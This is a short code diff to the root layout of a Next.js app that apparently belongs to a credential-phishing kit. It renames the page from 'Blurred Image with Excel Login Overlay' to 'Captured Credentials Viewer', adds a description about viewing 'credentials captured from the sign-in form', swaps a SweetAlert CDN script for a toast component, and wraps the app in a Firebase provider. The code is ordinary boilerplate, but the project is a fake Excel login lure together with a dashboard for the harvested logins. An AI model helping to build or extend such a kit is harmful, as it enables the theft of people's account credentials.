@@ -1,10 +1,11 @@
 import type { Metadata } from 'next';
 import './globals.css';
 import { FirebaseClientProvider } from '@/firebase';
-import Script from 'next/script';
+import { Toaster } from '@/components/ui/toaster';
 
 export const metadata: Metadata = {
-  title: 'Blurred Image with Excel Login Overlay',
+  title: 'Captured Credentials Viewer',
+  description: 'View credentials captured from the sign-in form.',
 };
 
 export default function RootLayout({
@@ -14,12 +15,11 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en" suppressHydrationWarning>
-      <head>
-        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" />
-      </head>
       <body suppressHydrationWarning>
-        <FirebaseClientProvider>{children}</FirebaseClientProvider>
-        <Script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></Script>
+        <FirebaseClientProvider>
+          {children}
+          <Toaster />
+        </FirebaseClientProvider>
       </body>
     </html>
   );
